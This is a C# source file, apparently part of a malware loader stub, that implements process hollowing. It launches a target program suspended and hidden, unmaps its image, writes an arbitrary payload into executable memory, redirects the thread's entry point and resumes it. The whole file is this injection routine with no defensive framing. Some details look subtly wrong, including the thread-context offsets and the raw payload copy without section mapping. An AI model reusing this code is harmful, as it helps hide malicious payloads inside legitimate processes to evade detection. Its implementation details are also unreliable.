using System;
using System.Runtime.InteropServices;

namespace NRE.Stub.Injection
{
    /// <summary>
    /// Process hollowing: create target process suspended, unmap original image, allocate and write payload, set entry and context, resume.
    /// </summary>
    public static class ProcessHollowing
    {
        private const uint CREATE_SUSPENDED = 0x00000004;
        private const uint CREATE_NO_WINDOW = 0x08000000;
        private const uint MEM_COMMIT = 0x1000;
        private const uint MEM_RESERVE = 0x2000;
        private const uint PAGE_EXECUTE_READWRITE = 0x40;
        private const uint CONTEXT_CONTROL = 0x00100001;

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool CreateProcessW(
            string lpApplicationName,
            string lpCommandLine,
            IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes,
            [MarshalAs(UnmanagedType.Bool)] bool bInheritHandles,
            uint dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            ref STARTUPINFOW lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("ntdll.dll")]
        private static extern int NtUnmapViewOfSection(IntPtr hProcess, IntPtr baseAddress);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool GetThreadContext(IntPtr hThread, IntPtr lpContext);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool SetThreadContext(IntPtr hThread, IntPtr lpContext);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, UIntPtr nSize, out UIntPtr lpNumberOfBytesRead);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, UIntPtr nSize, out UIntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        private static extern uint ResumeThread(IntPtr hThread);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool CloseHandle(IntPtr hObject);

        [StructLayout(LayoutKind.Sequential)]
        private struct STARTUPINFOW
        {
            public int cb;
            public IntPtr lpReserved;
            public IntPtr lpDesktop;
            public IntPtr lpTitle;
            public uint dwX, dwY, dwXSize, dwYSize;
            public uint dwXCountChars, dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput, hStdOutput, hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public uint dwProcessId;
            public uint dwThreadId;
        }

        private const int ContextSize = 0x4D0;
        private const int OffsetRcx = 0x090;
    private const int OffsetRdx = 0x098;

        public static bool Hollow(string targetPath, byte[] payload)
        {
            if (string.IsNullOrEmpty(targetPath) || payload == null || payload.Length < 64) return false;
            var si = new STARTUPINFOW { cb = Marshal.SizeOf(typeof(STARTUPINFOW)) };
            PROCESS_INFORMATION pi;
            if (!CreateProcessW(null, targetPath, IntPtr.Zero, IntPtr.Zero, false, CREATE_SUSPENDED | CREATE_NO_WINDOW, IntPtr.Zero, null, ref si, out pi))
                return false;
            try
            {
                IntPtr ctxBuf = Marshal.AllocHGlobal(ContextSize);
                try
                {
                    Marshal.WriteInt32(ctxBuf, 0, (int)CONTEXT_CONTROL);
                    if (!GetThreadContext(pi.hThread, ctxBuf))
                        return false;
                    long pebAddr = Marshal.ReadInt64(ctxBuf, OffsetRcx);
                    byte[] pebBuf = new byte[24];
                    UIntPtr read;
                    if (!ReadProcessMemory(pi.hProcess, (IntPtr)pebAddr, pebBuf, (UIntPtr)24, out read))
                        return false;
                    IntPtr imageBase = (IntPtr)BitConverter.ToInt64(pebBuf, 0x10);
                    if (NtUnmapViewOfSection(pi.hProcess, imageBase) != 0)
                        return false;
                    bool isPe = payload.Length >= 64 && BitConverter.ToUInt16(payload, 0) == 0x5A4D;
                    uint sizeOfImage = isPe ? BitConverter.ToUInt32(payload, BitConverter.ToInt32(payload, 0x3C) + 24 + 56) : (uint)payload.Length;
                    IntPtr newBase = VirtualAllocEx(pi.hProcess, imageBase, (UIntPtr)sizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
                    if (newBase == IntPtr.Zero)
                        newBase = VirtualAllocEx(pi.hProcess, IntPtr.Zero, (UIntPtr)sizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
                    if (newBase == IntPtr.Zero) return false;
                    UIntPtr written;
                    if (!WriteProcessMemory(pi.hProcess, newBase, payload, (UIntPtr)Math.Min(payload.Length, sizeOfImage), out written))
                        return false;
                    if (isPe)
                    {
                        int entryRva = BitConverter.ToInt32(payload, BitConverter.ToInt32(payload, 0x3C) + 24 + 16);
                        Marshal.WriteInt64(ctxBuf, 0x108, newBase.ToInt64() + entryRva);
                    }
                    else
                    {
                        Marshal.WriteInt64(ctxBuf, 0x108, newBase.ToInt64());
                    }
                    if (!SetThreadContext(pi.hThread, ctxBuf))
                        return false;
                }
                finally
                {
                    Marshal.FreeHGlobal(ctxBuf);
                }
                ResumeThread(pi.hThread);
                return true;
            }
            finally
            {
                CloseHandle(pi.hThread);
                CloseHandle(pi.hProcess);
            }
        }
    }
}
